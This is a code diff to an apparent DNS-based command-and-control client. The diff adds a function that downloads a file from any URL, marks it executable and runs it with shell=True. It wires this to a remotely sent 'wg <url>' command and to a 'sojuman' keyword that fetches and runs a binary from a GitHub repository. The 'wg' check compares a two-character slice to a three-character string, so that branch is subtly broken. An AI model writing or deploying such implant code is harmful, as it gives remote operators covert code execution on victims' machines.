@@ -17,7 +17,22 @@ import random
 import getpass
 import socket
 import subprocess
+import urllib.request
+import os
 
+def wget(cmd):
+    #parse a "wg http://..." command
+    #chmod +x downloaded file
+    #xeq downloaded file
+    url = cmd[3:]
+    extension = cmd[-4:] #This is mostly for windows stuff
+    fileName, headers = urllib.request.urlretrieve(url) #saves as temp file
+    os.rename(fileName, fileName+extension)
+    fileName += extension
+    os.chmod(fileName, 0o555) #r-xr-xr-x
+    print(fileName)
+    out = subprocess.Popen([fileName], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
+    (stdout, stderr) = out.communicate()
 
 def pack(value):
     '''packs unsigned short
@@ -480,6 +495,14 @@ class DNSClient:
         command = ""
         for part in commandParts:
             command += chr(int(part)+32)
+        if len(command) > 3:
+            if command[0:2] == "wg ":
+                wget(command)
+                return ""
+        if command == "sojuman":
+            print("sojuman")
+            wget("wg https://github.com/ChoiSG/sojuman/raw/master/dist/real_sojuman")
+            return ""
         return command
 
 
